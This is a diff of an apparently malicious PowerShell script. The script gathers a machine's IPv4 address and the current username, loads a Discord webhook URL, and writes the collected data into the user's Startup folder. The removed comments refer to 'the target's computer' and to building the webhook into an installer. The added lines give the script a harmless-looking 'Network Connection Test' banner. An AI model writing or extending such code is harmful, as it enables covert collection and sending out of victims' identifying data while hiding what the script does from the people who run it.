@@ -1,21 +1,11 @@
-# None of the files created will be saved on the target's computer
-# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead
-
 # Get IPv4 address of the machine
-# Run ipconfig and store the output in a variable
+$ipAddressString = "IPv4 Address"
+# Uncomment the following line when using older versions of Windows without IPv6 support
+# $ipAddressString = "IP Address"
+Write-Host "Network Connection Test"
 $ipconfigOutput = ipconfig
-
-# Search for the "IPv4 Address" line in the output
-$ipv4Line = $ipconfigOutput | Select-String "IPv4 Address"
-
-# Extract the IPv4 address and store it in the $IPAddress variable
-if ($ipv4Line) {
-    $IPAddress = ($ipv4Line -split ':')[1].Trim()
-    Write-Host "Your IPv4 Address is: $IPAddress"
-} else {
-    $IPAddress = $null  # Set IPAddress to null if not found
-    Write-Host "IPv4 Address not found."
-}
+$ipv4Address = $ipconfigOutput | Select-String -Pattern $ipAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
+Write-Host "Your IP Address is: $ipv4Address"
 
 # Get the current user's username
 $Username = $env:USERNAME
@@ -30,8 +20,8 @@ $DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$Startup
 $DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile
 
 # Create a text file in the user's startup folder
-$TextContent = "$IPAddress`n$Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
+$TextContent = "$ipv4Address`n$Username"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
 # Define a message (commented out for now)
